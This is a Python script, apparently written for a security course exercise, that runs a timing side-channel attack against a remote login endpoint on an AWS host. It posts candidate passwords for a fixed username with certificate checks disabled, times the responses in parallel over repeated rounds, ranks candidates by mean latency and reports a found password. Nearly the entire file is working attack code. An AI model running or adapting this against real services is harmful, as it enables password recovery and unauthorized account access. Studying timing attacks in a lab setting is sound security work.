# This is a sample Python script.

# Press ⇧F10 to execute it or replace it with your code.
# Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.
import datetime
import logging
import sys
import warnings
from multiprocessing import Pool
from typing import Tuple, List, Dict

import numpy as np
import requests

from test_server import test_local_compare

warnings.filterwarnings("ignore")

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO,
                    format='[%(asctime)s] - %(levelname)s - %(module)s: %(message)s',
                    stream=sys.stdout)


def send(pwd: str) -> Tuple[int, int]:
    start = datetime.datetime.now()
    r = requests.post(
        'https://ec2-18-218-24-114.us-east-2.compute.amazonaws.com:8080',
        data={'username': 'au597939', 'password': pwd},
        verify=False
    )
    end = datetime.datetime.now()
    delta = (end - start)
    logger.info(f'{r.status_code} - {r.text.strip()} | {pwd} - {delta.microseconds}')
    if r.status_code in {200, 201}:
        print(f'PWD FOUND! - {pwd}')
        exit(0)

    return r.status_code, delta.microseconds


def test_locally(pwd: str) -> Tuple[int, int]:
    start = datetime.datetime.now()
    return_code = test_local_compare(pwd)
    status_code = 200 if return_code else 403
    end = datetime.datetime.now()
    delta = (end - start)
    logger.info(f'{status_code} | {pwd} - {delta.microseconds}')
    if status_code in {200, 201}:
        print(f'PWD FOUND! - {pwd}')
        exit(0)

    return status_code, delta.microseconds


def sample(pwd: str, rounds: int = 20) -> Tuple[str, int]:
    micros = np.asarray([send(pwd)[1] for _ in range(rounds)])
    logger.info(f'MED={np.median(micros)}, E={micros.mean()}, ST={micros.std()} || {pwd}')
    return pwd, micros.mean()


def send_with_pwd(pwd: str) -> Tuple[str, int]:
    _, time = send(pwd)
    return pwd, time


def verify_passwords(passwords: List[str], sample_rounds: int = 20) -> Dict[str, int]:
    means = {pwd: [] for pwd in passwords}
    with Pool() as pool:
        for result in pool.map(send_with_pwd, passwords * sample_rounds):
            pwd, micros = result
            means[pwd].append(micros)

    pwd_mean = []
    for pwd, v in means.items():
        micros = np.asarray(v)
        micros.sort()
        # delete outliers
        micros = micros[1:-1]
        logger.info(f'COUNT={micros.size}, MED={np.median(micros)}, E={micros.mean()}, ST={micros.std()} -- {pwd}')
        pwd_mean.append((pwd, micros.mean()))

    pwd_mean.sort(key=lambda x: x[1], reverse=True)
    for pwd, mean in pwd_mean:
        logger.info(f'{mean} - {pwd}')
    return {pwd: mean for pwd, mean in pwd_mean}


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    verify_passwords(
        [
            'none', 'Passw', 'Passwor', 'Password123', 'Password111'
        ]
    )
